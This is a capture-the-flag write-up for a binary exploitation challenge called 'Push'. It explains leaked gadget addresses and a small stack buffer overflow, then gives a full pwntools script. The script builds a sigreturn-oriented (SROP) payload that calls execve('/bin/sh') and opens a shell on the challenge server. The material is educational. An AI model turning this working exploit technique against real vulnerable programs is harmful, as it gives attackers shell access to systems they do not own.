# Push

Author: v10l3nt

## Description

Remember those Sarah McLaughlan commercials about the puppies? We do. We made a blind challenge to remind you about the heartbreak.

0.cloud.chals.io:21978

## Overview

The first push returned gives the address to a `pop rax; pop rax; pop rax; pop rax; ret` gadget. The value `0x58` is the opcode for `pop rax`. The second push returns the opcode of `0x0f05` which is `syscall`.

Poking at the input shows that inputing 16 charaters will break the program. This probably means the buffer is 8 charaters and the second set of 8 is rbp.

The easiest way to exploit it is to create a sigreturn frame and call `execve` on the address of `/bin/sh`. 

## Solution

```python
from pwn import *

binary = args.BIN

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
e = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.attach(e.path)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 21978)
    else:
        return process(e.path)

p = start()

buffer = b'a'*16

p.recvuntil(b' : ')
bin_sh  = int(p.recvline(), 16)

p.sendline(b'>>> ')
p.sendline(b'Y')
p.recvuntil(b' | ')
pop_rax = int(p.recvline(), 16) + 6

p.sendline(b'>>>')
p.sendline(b'Y')
p.recvuntil(b' | ')
syscall = int(p.recvline(), 16) + 4

log.success(f"/bin/sh : {hex(bin_sh)}")
log.success(f"pop rax; ret : {hex(pop_rax)}")
log.success(f"syscall; ret : {hex(syscall)}")

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = buffer
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(frame)

p.sendline(payload)

p.interactive()
```

